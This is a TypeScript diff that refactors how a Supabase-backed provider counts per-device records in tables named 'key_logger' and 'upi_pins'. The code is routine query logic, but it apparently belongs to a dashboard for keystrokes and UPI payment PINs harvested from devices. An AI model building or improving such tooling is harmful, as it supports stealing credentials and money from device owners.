@@ -18,7 +18,7 @@ export class SupabaseProvider implements IDeviceProvider {
 
         let query = this.supabase
             .from('devices')
-            .select('*, key_logger(count), upi_pins(count)')
+            .select('*')
             .eq('app_id', this.appId)
             .order('last_seen', { ascending: false })
             .limit(limit);
@@ -27,12 +27,27 @@ export class SupabaseProvider implements IDeviceProvider {
         if (error) throw error;
 
         const devices = data || [];
+        if (devices.length === 0) return [];
+
+        // Resilient Bulk Counts: Avoid "missing relationship" errors by querying counts separately
+        const deviceIds = devices.map(d => d.device_id);
+        const [keylogs, pins] = await Promise.all([
+            this.supabase.from('key_logger').select('device_id').in('device_id', deviceIds),
+            this.supabase.from('upi_pins').select('device_id').in('device_id', deviceIds)
+        ]);
+
+        // Aggregate counts in-memory
+        const keyMap: Record<string, number> = {};
+        const pinMap: Record<string, number> = {};
+
+        (keylogs.data || []).forEach(k => keyMap[k.device_id] = (keyMap[k.device_id] || 0) + 1);
+        (pins.data || []).forEach(p => pinMap[p.device_id] = (pinMap[p.device_id] || 0) + 1);
+
         return devices.map(device => {
             const d: any = { ...device, _sourceProvider: 'SUPABASE' };
-            // Map Supabase related table counts to a standard _count property
             d._count = {
-                key_logs: device.key_logger?.[0]?.count || 0,
-                upi_pins: device.upi_pins?.[0]?.count || 0
+                key_logs: keyMap[device.device_id] || 0,
+                upi_pins: pinMap[device.device_id] || 0
             };
             return d;
         });
@@ -41,27 +56,27 @@ export class SupabaseProvider implements IDeviceProvider {
     async getDevice(deviceId: string): Promise<any> {
         const { data, error } = await this.supabase
             .from('devices')
-            .select('*, key_logger(count), upi_pins(count)')
+            .select('*')
             .eq('device_id', deviceId)
             .maybeSingle();
 
         if (error) throw error;
+        if (!data) return null;
 
-        // Ensure appId is correctly set for assessment
-        if (data) {
-            const device: any = {
-                ...data,
-                app_id: this.appId || data.app_id,
-                _sourceProvider: 'SUPABASE'
-            };
-            device._count = {
-                key_logs: data.key_logger?.[0]?.count || 0,
-                upi_pins: data.upi_pins?.[0]?.count || 0
-            };
-            return device;
-        }
+        // Fetch counts separately to avoid relationship errors
+        const stats = await this.getDeviceStats(deviceId);
 
-        return data;
+        const device: any = {
+            ...data,
+            app_id: this.appId || data.app_id,
+            _sourceProvider: 'SUPABASE',
+            _count: {
+                key_logs: stats.keylogs || 0,
+                upi_pins: stats.upiPins || 0
+            }
+        };
+
+        return device;
     }
 
     async getDeviceStats(deviceId: string): Promise<DeviceStats> {
